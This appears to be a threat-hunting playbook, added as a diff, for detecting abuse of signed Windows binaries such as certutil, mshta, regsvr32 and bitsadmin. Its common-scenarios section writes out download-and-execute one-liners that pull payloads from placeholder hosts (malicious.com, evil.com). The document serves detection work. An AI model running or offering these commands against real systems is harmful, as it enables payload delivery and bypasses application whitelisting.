@@ -1,0 +1,127 @@
+\title{Hunting For Living Off The Land Binaries}
+
+\taxon{skill}
+
+\tag{threat-hunting}
+
+\tag{mitre-attack}
+
+\tag{lolbins}
+
+\tag{edr}
+
+\tag{siem}
+
+\tag{proactive-detection}
+
+\tag{defense-evasion}
+
+\meta{version}{"1.0"}
+
+\meta{description}{Proactively hunt for adversary abuse of legitimate system binaries (LOLBins) to execute malicious payloads while evading detection.}
+
+\subtree{
+\title{Hunting for Living-off-the-Land Binaries (LOLBins)}
+\subtree{
+\title{When to Use}
+\ul{
+\li{When investigating fileless malware campaigns that bypass traditional AV}
+\li{During proactive threat hunts targeting defense evasion techniques}
+\li{When EDR alerts fire on legitimate binaries executing unusual child processes}
+\li{After threat intelligence reports indicate LOLBin abuse in active campaigns}
+\li{During red team/purple team exercises validating detection coverage for T1218}
+}
+}
+
+\subtree{
+\title{Prerequisites}
+\ul{
+\li{Access to EDR telemetry (CrowdStrike, Microsoft Defender for Endpoint, SentinelOne)}
+\li{SIEM with process creation logs (Sysmon Event ID 1, Windows Security 4688)}
+\li{Familiarity with LOLBAS Project (lolbas-project.github.io) reference list}
+\li{PowerShell command-line logging enabled (Module Logging, Script Block Logging)}
+\li{Network proxy or firewall logs for correlating outbound connections}
+}
+}
+
+\subtree{
+\title{Workflow}
+\ol{
+\li{\strong{Define Hunt Hypothesis}: Formulate a hypothesis based on threat intel (e.g., "Adversaries are using certutil.exe to download second-stage payloads from external domains").}
+\li{\strong{Identify Target LOLBins}: Select specific binaries from the LOLBAS Project database to hunt for, prioritizing those matching current threat landscape (certutil, mshta, rundll32, regsvr32, msiexec, wmic, cmstp, bitsadmin).}
+\li{\strong{Collect Process Telemetry}: Query EDR or SIEM for process creation events involving target LOLBins with unusual command-line arguments, parent processes, or execution contexts.}
+\li{\strong{Baseline Normal Behavior}: Establish what legitimate usage looks like for each LOLBin in your environment by analyzing historical frequency, typical parent processes, and standard arguments.}
+\li{\strong{Identify Anomalies}: Compare current telemetry against baselines, flagging executions with network connections, encoded commands, unusual file paths, or abnormal parent-child process chains.}
+\li{\strong{Correlate and Enrich}: Cross-reference anomalous LOLBin activity with network logs, DNS queries, file creation events, and threat intelligence feeds.}
+\li{\strong{Document and Report}: Record findings, update detection rules, and create IOC lists for identified malicious LOLBin usage.}
+}
+}
+
+\subtree{
+\title{Key Concepts}
+\pre{\startverb
+| Concept | Description |
+|---------|-------------|
+| LOLBin | Legitimate OS binary abused by attackers for malicious purposes |
+| LOLBAS Project | Community-curated list of Windows LOLBins, LOLLibs, and LOLScripts |
+| T1218 | MITRE ATT&CK - Signed Binary Proxy Execution |
+| T1218.001 | Compiled HTML File (mshta.exe) |
+| T1218.002 | Control Panel (control.exe) |
+| T1218.003 | CMSTP |
+| T1218.005 | Mshta |
+| T1218.010 | Regsvr32 |
+| T1218.011 | Rundll32 |
+| T1197 | BITS Jobs (bitsadmin.exe) |
+| T1140 | Deobfuscate/Decode Files (certutil.exe) |
+| Proxy Execution | Using trusted binaries to execute untrusted code |
+| Fileless Attack | Attack that operates primarily in memory without dropping files |
+\stopverb}
+}
+
+\subtree{
+\title{Tools & Systems}
+\pre{\startverb
+| Tool | Purpose |
+|------|---------|
+| CrowdStrike Falcon | EDR telemetry and process tree analysis |
+| Microsoft Defender for Endpoint | Advanced hunting with KQL queries |
+| Splunk | SIEM log aggregation and SPL queries |
+| Elastic Security | Detection rules and timeline investigation |
+| Sysmon | Detailed process creation and network logging |
+| LOLBAS Project | Reference database of LOLBin capabilities |
+| Sigma Rules | Generic detection rule format for LOLBins |
+| Velociraptor | Endpoint forensic collection and hunting |
+\stopverb}
+}
+
+\subtree{
+\title{Common Scenarios}
+\ol{
+\li{\strong{Certutil Download Cradle}: Adversary uses \code{\startverb certutil.exe -urlcache -split -f http://malicious.com/payload.exe\stopverb} to download malware, bypassing web proxies that allow certutil traffic.}
+\li{\strong{Mshta HTA Execution}: Attacker delivers HTA file via email that executes VBScript payload through \code{\startverb mshta.exe\stopverb}, which is a signed Microsoft binary.}
+\li{\strong{Rundll32 DLL Proxy Load}: Malicious DLL loaded via \code{\startverb rundll32.exe shell32.dll,ShellExec_RunDLL\stopverb} to proxy execution through a trusted binary.}
+\li{\strong{Regsvr32 Squiblydoo}: Remote SCT file executed via \code{\startverb regsvr32 /s /n /u /i:http://evil.com/file.sct scrobj.dll\stopverb} bypassing application whitelisting.}
+\li{\strong{BITSAdmin Persistence}: Adversary creates BITS transfer job to repeatedly download and execute payloads using \code{\startverb bitsadmin /transfer\stopverb}.}
+}
+}
+
+\subtree{
+\title{Output Format}
+\pre{\startverb
+Hunt ID: TH-LOLBIN-[DATE]-[SEQ]
+Hypothesis: [Stated hypothesis]
+LOLBins Investigated: [List of binaries]
+Time Range: [Start] - [End]
+Data Sources: [EDR, Sysmon, SIEM]
+Findings:
+  - [Finding 1 with evidence]
+  - [Finding 2 with evidence]
+Anomalies Detected: [Count]
+True Positives: [Count]
+False Positives: [Count]
+IOCs Identified: [List]
+Detection Rules Created/Updated: [List]
+Recommendations: [Next steps]
+\stopverb}
+}
+}
